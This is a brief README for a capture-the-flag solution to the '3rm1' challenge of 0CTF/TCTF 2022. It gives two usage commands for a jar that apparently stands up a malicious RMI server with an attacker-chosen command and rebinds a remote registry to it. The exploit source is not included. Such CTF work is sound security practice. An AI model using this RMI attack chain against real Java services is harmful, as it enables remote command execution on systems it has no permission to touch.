# 0ctf-2022-soln-3rm1
solution to 3rm1 of 0CTF/TCTF 2022

```sh
# This is a solution to 3rm1
# Usage: (replace L_HOST, L_PORT, R_HOST, R_PORT and CMD with yours)
java -Djava.rmi.server.logCalls=true -Djava.rmi.server.hostname=L_HOST -cp soln-all.jar soln.ServerKt CMD L_PORT
java -cp soln-all.jar soln.RebindKt L_PORT R_HOST R_PORT
```
